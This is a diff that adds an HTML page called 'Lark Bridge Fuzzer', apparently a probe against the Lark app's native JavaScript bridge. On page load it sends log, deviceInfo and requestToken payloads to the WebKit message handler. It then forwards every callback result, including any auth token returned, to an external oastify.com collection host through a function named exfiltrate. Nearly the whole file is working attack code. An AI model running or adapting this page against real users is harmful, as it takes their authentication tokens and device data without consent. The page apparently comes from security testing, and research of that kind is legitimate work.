@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lark Bridge Fuzzer</title>
+</head>
+<body>
+    <h1>Testing Lark Bridge...</h1>
+    <script>
+        const WEBHOOK_URL = "https://bze14eeug2h754wy1mnaysybq2wtkj88.oastify.com";
+
+        function exfiltrate(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: typeof data === 'string' ? data : JSON.stringify(data)
+            }).catch(e => {});
+        }
+
+        window.larkCallback = function(res) {
+            exfiltrate({type: "CALLBACK_TRIGGERED", data: res});
+        };
+
+        // Try to trigger a native log or non-sensitive action to prove execution
+        function testBridge() {
+            // Test 1: The 'log' command we saw in the Lark JS strings
+            const logPayload = {
+                method: "log", 
+                args: { content: "Pwned from gelo.gg", level: 1 }
+            };
+
+            // Test 2: The 'deviceInfo' API
+            const devicePayload = {
+                apiName: "deviceInfo",
+                callbackID: "larkCallback"
+            };
+
+            // Test 3: The 'requestAuthToken' API (alternative naming)
+            const tokenPayload = {
+                method: "requestToken", // Note: sometimes 'method' is used instead of 'apiName'
+                callback: "larkCallback",
+                args: {}
+            };
+
+            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.invoke) {
+                // Send as Objects
+                try { window.webkit.messageHandlers.invoke.postMessage(logPayload); } catch(e){}
+                try { window.webkit.messageHandlers.invoke.postMessage(devicePayload); } catch(e){}
+                try { window.webkit.messageHandlers.invoke.postMessage(tokenPayload); } catch(e){}
+
+                // Send as Strings (Lark's Mail JS uses JSON.stringify sometimes)
+                try { window.webkit.messageHandlers.invoke.postMessage(JSON.stringify(logPayload)); } catch(e){}
+                try { window.webkit.messageHandlers.invoke.postMessage(JSON.stringify(devicePayload)); } catch(e){}
+                try { window.webkit.messageHandlers.invoke.postMessage(JSON.stringify(tokenPayload)); } catch(e){}
+                
+                exfiltrate("Bridge commands fired.");
+            }
+        }
+
+        testBridge();
+    </script>
+</body>
+</html>
